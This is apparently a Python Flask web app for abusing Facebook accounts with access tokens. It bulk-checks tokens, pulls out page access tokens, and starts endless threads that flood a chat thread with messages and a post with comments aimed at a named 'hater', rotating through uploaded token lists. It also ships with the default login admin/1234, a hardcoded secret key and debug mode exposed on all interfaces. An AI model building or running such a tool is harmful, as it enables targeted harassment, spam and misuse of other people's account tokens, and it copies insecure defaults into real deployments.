from flask import Flask, request, render_template, redirect, url_for, session
import requests
import os
import threading
import time
import random
import string
from threading import Thread, Event

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "supersecret")

# -----------------------------
# Config
# -----------------------------
USERNAME = os.environ.get("APP_USERNAME", "admin")
PASSWORD = os.environ.get("APP_PASSWORD", "1234")

FB_GRAPH_URL = "https://graph.facebook.com/v20.0"

# Task tracking
stop_events = {}
threads = {}

# Headers for convo API calls
headers = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "application/json",
    "referer": "www.google.com"
}

# -----------------------------
# Login + Dashboard
# -----------------------------
@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username == USERNAME and password == PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        else:
            return render_template("login.html", error="Invalid credentials")
    return render_template("login.html")

@app.route("/dashboard")
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    return render_template("dashboard.html")

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

# -----------------------------
# Token Checker
# -----------------------------
@app.route("/check", methods=["GET", "POST"])
def check_token():
    if not session.get("logged_in"):
        return redirect(url_for("login"))

    results = []
    if request.method == "POST":
        tokens_input = request.form.get("tokens")
        tokens = [t.strip() for t in tokens_input.splitlines() if t.strip()]
        for token in tokens:
            url = f"{FB_GRAPH_URL}/me"
            res = requests.get(url, params={"access_token": token})
            if res.status_code == 200:
                data = res.json()
                results.append({"token": token, "status": "valid",
                                "user": f"{data.get('name')} (ID: {data.get('id')})"})
            else:
                try:
                    err = res.json()
                except:
                    err = {"error": "Unknown error"}
                results.append({"token": token, "status": "invalid", "error": err})
    return render_template("check.html", results=results)

# -----------------------------
# Page Extractor
# -----------------------------
@app.route("/extract", methods=["GET", "POST"])
def extract_pages():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    pages, error = None, None
    if request.method == "POST":
        user_token = request.form.get("token")
        url = f"{FB_GRAPH_URL}/me/accounts"
        res = requests.get(url, params={"access_token": user_token})
        if res.status_code == 200:
            data = res.json()
            if "data" in data and data["data"]:
                pages = [{"name": p["name"], "id": p["id"], "access_token": p["access_token"]}
                         for p in data["data"]]
            else:
                error = "No pages found for this account."
        else:
            error = f"Error: {res.json()}"
    return render_template("extract.html", pages=pages, error=error)

# -----------------------------
# Convo
# -----------------------------
@app.route("/convo", methods=["GET", "POST"])
def convo():
    if not session.get("logged_in"):
        return redirect(url_for("login"))

    if request.method == "POST":
        token_option = request.form.get("tokenOption")
        if token_option == "single":
            access_tokens = [request.form.get("singleToken")]
        else:
            token_file = request.files["tokenFile"]
            access_tokens = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get("threadId")
        mn = request.form.get("kidx")
        time_interval = int(request.form.get("time"))
        txt_file = request.files["txtFile"]
        messages = txt_file.read().decode().splitlines()

        task_id = "".join(random.choices(string.ascii_letters + string.digits, k=20))
        stop_events[task_id] = Event()
        thread = Thread(target=send_messages,
                        args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f"""
        ✅ Convo Task Started!<br>
        🧠 Stop Key: <b>{task_id}</b><br><br>
        <form method="POST" action="/stop">
            <input name="taskId" value="{task_id}" readonly>
            <button type="submit">🛑 Stop</button>
        </form>
        """
    return render_template("convo_form.html")

def send_messages(tokens, thread_id, mn, interval, messages, task_id):
    stop_event = stop_events[task_id]
    while not stop_event.is_set():
        for msg in messages:
            if stop_event.is_set():
                break
            for token in tokens:
                url = f"https://graph.facebook.com/v15.0/t_{thread_id}/"
                message = str(mn) + " " + msg
                res = requests.post(url, data={"access_token": token, "message": message}, headers=headers)
                print("✅" if res.status_code == 200 else "❌", message)
                time.sleep(interval)

# -----------------------------
# Post
# -----------------------------
@app.route("/post", methods=["GET", "POST"])
def post():
    if not session.get("logged_in"):
        return redirect(url_for("login"))

    if request.method == "POST":
        count = int(request.form.get("count", 0))
        task_ids = []
        for i in range(1, count + 1):
            post_id = request.form.get(f"id_{i}")
            hname = request.form.get(f"hatername_{i}")
            delay = request.form.get(f"delay_{i}")
            token_file = request.files.get(f"token_{i}")
            msg_file = request.files.get(f"comm_{i}")
            tokens = token_file.read().decode().splitlines()
            comments = msg_file.read().decode().splitlines()

            task_id = "".join(random.choices(string.ascii_letters + string.digits, k=20))
            stop_events[task_id] = Event()
            thread = Thread(target=post_comments,
                            args=(post_id, tokens, comments, hname, int(delay), task_id))
            thread.start()
            threads[task_id] = thread
            task_ids.append(task_id)

        response = ""
        for tid in task_ids:
            response += f"""
                ✅ Post Task Started!<br>
                🧠 Stop Key: <b>{tid}</b><br><br>
                <form method='POST' action='/stop'>
                    <input type='hidden' name='taskId' value='{tid}'>
                    <button type='submit'>🛑 Stop This Task</button>
                </form><br><hr>
            """
        return response
    return render_template("post_form.html")

def post_comments(post_id, tokens, comments, hname, delay, task_id):
    stop_event = stop_events[task_id]
    token_index = 0
    while not stop_event.is_set():
        comment = f"{hname} {random.choice(comments)}"
        token = tokens[token_index % len(tokens)]
        url = f"https://graph.facebook.com/{post_id}/comments"
        res = requests.post(url, data={"message": comment, "access_token": token})
        print("✅" if res.status_code == 200 else "❌", comment)
        token_index += 1
        time.sleep(delay)

# -----------------------------
# Stop Tasks
# -----------------------------
@app.route("/stop", methods=["GET", "POST"])
def stop():
    if request.method == "POST":
        task_id = request.form["taskId"]
        if task_id in stop_events:
            stop_events[task_id].set()
            return f"🛑 Task <b>{task_id}</b> stopped!"
        return "❌ Invalid Task ID"
    return """
    <h3>Stop Task</h3>
    <form method="POST">
        <input name="taskId" placeholder="Task ID">
        <button type="submit">🛑 Stop</button>
    </form>
    """

# -----------------------------
# Keep Alive
# -----------------------------
def keep_alive():
    while True:
        try:
            url = os.environ.get("RENDER_EXTERNAL_URL")
            if url: requests.get(url)
        except Exception as e:
            print("Keep-alive error:", e)
        time.sleep(600)

threading.Thread(target=keep_alive, daemon=True).start()

# -----------------------------
# Run
# -----------------------------
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=True)
